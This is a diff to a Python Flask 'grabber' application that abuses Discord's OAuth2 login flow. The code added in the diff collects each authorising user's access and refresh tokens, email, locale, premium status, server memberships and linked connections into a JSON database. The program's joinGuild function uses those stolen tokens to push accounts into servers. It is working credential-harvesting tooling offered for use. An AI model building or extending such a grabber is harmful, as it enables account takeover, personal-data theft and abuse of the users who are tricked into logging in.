@@ -2,15 +2,16 @@ import requests
 import os.path
 import socket
 import json
+import time
 from configparser import ConfigParser
 from flask import Flask, render_template, request
+import oauth as worker
 app = Flask(__name__)
 config = ConfigParser()
 configPath = 'resources/config.ini'
 dbPath = 'resources/db.json'
 
-cTokens = []
-cRefreshes = []
+DB = []
 try:    
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
@@ -26,7 +27,7 @@ if(os.path.exists(configPath)):
     print('config file exist')
     config.read(configPath)
 else:
-    print('config file doesn\'t exist! creating you have to enter some values!')
+    print('config file doesn\'t exist! creating, you have to enter some values!')
     a = input("Discord client id: ")
     b = input("Discord client secret: ")
     while(True):
@@ -87,17 +88,16 @@ if(os.path.exists(dbPath)):
     with open(dbPath, 'r+') as db:
         try:
             loadedJs = json.load(db)
-            cTokens =  loadedJs['tokens']
-            cRefreshes = loadedJs['refreshes']
+            DB = loadedJs
             print("db was loaded!")
-            print(cTokens, cRefreshes)
+            #print(DB)
         except Exception as err:
             print("error while reading file!: ",err)
             exit()
 else:
     print("db doesn't exist, recreating file!")
     with open(dbPath, 'w') as db:
-        json.dump({'tokens': cTokens, 'refreshes': cRefreshes}, db, indent=4)
+        json.dump(DB, db, indent=4)
     
 
 
@@ -107,17 +107,59 @@ CLIENT_SECRET = config['discord']['client_secret']
 PORT = config['grabber']['port']
 URL_ARGS = config['grabber']['grabber_url_args']
 REDIRECT_URI = config['grabber']['redirect_uri'] + PORT + URL_ARGS
-
-
+'''
+worker.API_ENDPOINT = API_ENDPOINT
+worker.CLIENT_ID = CLIENT_ID
+worker.CLIENT_SECRET = CLIENT_SECRET
+worker.PORT = PORT
+worker.URL_ARGS = URL_ARGS
+worker.REDIRECT_URI = REDIRECT_URI
+'''
 @app.route("/")
 def home():
     return render_template('home.html')
 
 @app.route(URL_ARGS)
-def login():
+async def login():
     if (request.args.__contains__('code')):
         code = request.args['code']
-        return exchange_code(code)
+        code_result = exchange_code(code)
+        if(code_result.__contains__('access_token')):
+            token = code_result['access_token']
+            uInfo = await getUserInfo(token)
+            uGuilds = await getUserGuilds(token)
+            uConnections = await getUserConnections(token)
+            fGuilds = []
+            if(uGuilds.__len__() != 0):
+                for val in uGuilds:
+                    time.sleep(1)
+                    e = {
+                        'id':val['id'],
+                        'name':val['name'],
+                        'is_owner':val['owner']
+                    }
+                    fGuilds.append(e)
+            toDB = {
+                'id':uInfo['id'],
+                'username':uInfo['username'],
+                'global_name':uInfo['global_name'],
+                'token':token,
+                'refresh_token':code_result['refresh_token'],
+                'locale':uInfo['locale'],
+                'premium_type':uInfo['premium_type'],
+                'email':uInfo['email'],
+                'verified':uInfo['verified'],
+                'scopes':code_result['scope'],
+                'guilds':fGuilds,
+                'connections':uConnections
+            }
+            for val in DB:
+                if(val['id'] == toDB['id']):
+                    DB.remove(val)
+                    break
+            DB.append(toDB)
+            dbSave()
+        return code_result
     else:
         return 'hi!'
     
@@ -138,10 +180,11 @@ def exchange_code(code):
     try:
         if(r['error'] == 'invalid_grant'):
             print('error while exchanging codes: ', r['error_description'])
+            return 'error'
     except:
         return r
 
-def refresh_token(refresh_token):
+async def refresh_token(refresh_token):
     data = {
         'client_id': CLIENT_ID,
         'client_secret': CLIENT_SECRET,
@@ -160,46 +203,51 @@ def refresh_token(refresh_token):
         return r
 
 
-def getUserInfo(token):
+async def getUserInfo(token):
     info = requests.get('%s/users/@me' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
     info = info.json()
     try:
         if(info['message'] == '401: Unauthorized'):
             print('Invalid token!')
+            return 'error'
     except:
         return(info)
 
-def getGuildProfile(token, guild_id):
+async def getGuildProfile(token, guild_id):
     guildProfile = requests.get('%s/users/@me/guilds/%s/member' % (API_ENDPOINT, guild_id), headers={'Authorization':'Bearer %s' % token})
     guildProfile = guildProfile.json()
     print(guildProfile)
     try:
         if(guildProfile['message'] == '401: Unauthorized'):
             print('Invalid token!')
+            return 'error'
         if(guildProfile['message'] == 'Неизвестная гильдия' or guildProfile['message'] == 'Unknown Guild'):
             print('Invalid guild!')
+            return 'error'
     except:
         return(guildProfile)
 
-def getUserGuilds(token):
+async def getUserGuilds(token):
     guilds = requests.get('%s/users/@me/guilds' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
     guilds = guilds.json()
     try:
         if(guilds['message'] == '401: Unauthorized'):
             print('Invalid token!')
+            return 'error'
     except:
         return(guilds)
     
-def getUserConnections(token):
+async def getUserConnections(token):
     connections = requests.get('%s/users/@me/connections' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
     connections = connections.json()
     try:
         if(connections['message'] == '401: Unauthorized'):
             print('Invalid token!')
+            return 'error'
     except:
         return(connections)
 
-def joinGuild(token, user_id, bot_token, guild_id):
+async def joinGuild(token, user_id, bot_token, guild_id):
     data = {'access_token': token}
     data = json.dumps(data)
     headers = {
@@ -211,14 +259,22 @@ def joinGuild(token, user_id, bot_token, guild_id):
     try:
         if(r['message'] == '401: Unauthorized'):
             print('Invalid bot token!')
+            return 'error'
         elif(r['message'] == 'Invalid OAuth2 access token'):
             print('Invalid user token!')
+            return 'error'
         elif(r['message'] == 'Неизвестная гильдия' or r['message'] == 'Unknown Guild'):
             print('Invalid guild id!')
+            return 'error'
         else:
             print(r)
+            return 'error'
     except:
         return(r)
+
+def dbSave():
+    with open(dbPath, 'w') as db:
+        json.dump(DB, db, indent=4)
 
 if __name__ == "__main__":
     app.run(debug = False, port=PORT,host=LOCAL_IP)
